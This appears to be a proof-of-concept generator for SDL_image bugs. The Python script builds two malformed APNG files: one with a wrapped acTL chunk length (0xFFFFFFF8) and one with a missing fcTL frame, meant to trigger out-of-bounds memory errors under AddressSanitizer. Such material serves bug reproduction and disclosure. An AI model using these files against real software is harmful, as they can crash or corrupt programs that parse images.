#!/usr/bin/env python3

import argparse
import binascii
import struct
import zlib
from pathlib import Path


PNG_SIG = b"\x89PNG\r\n\x1a\n"


def be32(value: int) -> bytes:
    return struct.pack(">I", value & 0xFFFFFFFF)


def be16(value: int) -> bytes:
    return struct.pack(">H", value & 0xFFFF)


def chunk(chunk_type: bytes, data: bytes) -> bytes:
    crc = binascii.crc32(chunk_type)
    crc = binascii.crc32(data, crc) & 0xFFFFFFFF
    return be32(len(data)) + chunk_type + data + be32(crc)


def make_chunk_wrap_poc() -> bytes:
    fake_len = 0xFFFFFFF8
    fake_type = b"acTL"
    tail = b"A" * 32
    return PNG_SIG + be32(fake_len) + fake_type + tail


def make_missing_fctl_poc() -> bytes:
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 6, 0, 0, 0)
    actl = struct.pack(">II", 2, 0)
    fctl = (
        be32(0) +
        be32(1) +
        be32(1) +
        be32(0) +
        be32(0) +
        be16(1) +
        be16(10) +
        b"\x00" +
        b"\x00"
    )
    raw_scanline = b"\x00\xff\x00\x00\xff"
    idat = zlib.compress(raw_scanline)
    return (
        PNG_SIG +
        chunk(b"IHDR", ihdr) +
        chunk(b"acTL", actl) +
        chunk(b"fcTL", fctl) +
        chunk(b"IDAT", idat) +
        chunk(b"IEND", b"")
    )


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate SDL_image APNG ASAN PoCs.")
    parser.add_argument(
        "--output-dir",
        default="out",
        help="directory to write generated PoCs",
    )
    args = parser.parse_args()

    out_dir = Path(args.output_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    chunk_wrap = out_dir / "apng_chunk_wrap_trigger.png"
    missing_fctl = out_dir / "apng_missing_fctl_oob.apng"

    chunk_wrap.write_bytes(make_chunk_wrap_poc())
    missing_fctl.write_bytes(make_missing_fctl_poc())

    print(chunk_wrap)
    print(missing_fctl)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
